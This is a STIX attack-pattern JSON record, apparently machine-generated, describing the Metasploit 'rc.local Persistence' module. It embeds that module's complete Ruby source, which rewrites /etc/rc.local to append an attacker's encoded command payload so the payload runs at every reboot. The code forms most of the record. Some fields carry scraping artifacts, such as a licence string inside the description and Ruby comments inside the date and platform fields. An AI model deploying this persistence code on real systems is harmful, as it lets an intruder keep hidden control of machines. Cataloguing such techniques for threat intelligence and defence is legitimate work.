{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c740a8ba-3c99-4e61-90fb-71c41c6ba3ab",
    "created": "2024-08-14T16:59:43.181685Z",
    "modified": "2024-08-14T16:59:43.181689Z",
    "name": "rc.local Persistence",
    "description": "( This module will edit /etc/rc.local in order to persist a payload. The payload will be executed on the next reboot. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/rc_local_persistence.rb",
            "external_id": "rc_local_persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'rc.local Persistence',\n      'Description'    => %q(\n        This module will edit /etc/rc.local in order to persist a payload.\n        The payload will be executed on the next reboot.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Eliott Teissonniere' ],\n      'Platform'       => [ 'unix', 'linux' ],\n      'Arch'           => ARCH_CMD,\n      'Payload'        => {\n        'BadChars'   => \"#%\\n\",\n        'Compat'     => {\n          'PayloadType'  => 'cmd',\n          'RequiredCmd'  => 'generic python ruby netcat perl'\n        }\n      },\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },\n      'DisclosureDate' => '1980-10-01', # The rc command appeared in 4.0BSD.\n      'Targets'        => [ ['Automatic', {}] ],\n      'DefaultTarget'  => 0\n    ))\n  end\n\n  def exploit\n    rc_path = '/etc/rc.local'\n\n    unless writable? rc_path\n      fail_with Failure::BadConfig, \"#{rc_path} is not writable\"\n    end\n\n    print_status \"Reading #{rc_path}\"\n\n    # read /etc/rc.local, but remove `exit 0`\n    rc_local = read_file(rc_path).gsub(/^exit.*$/, '')\n\n    # add payload and put back `exit 0`\n    rc_local << \"\\n#{payload.encoded}\\nexit 0\\n\"\n\n    # write new file\n    print_status \"Patching #{rc_path}\"\n    write_file(rc_path, rc_local)\n  end\nend\n",
    "x_mitre_disclosure_date": "1980-10-01, # The rc command appeared in 4.0BSD.",
    "x_mitre_platforms": [
        "[ 'unix', 'linux' ]"
    ]
}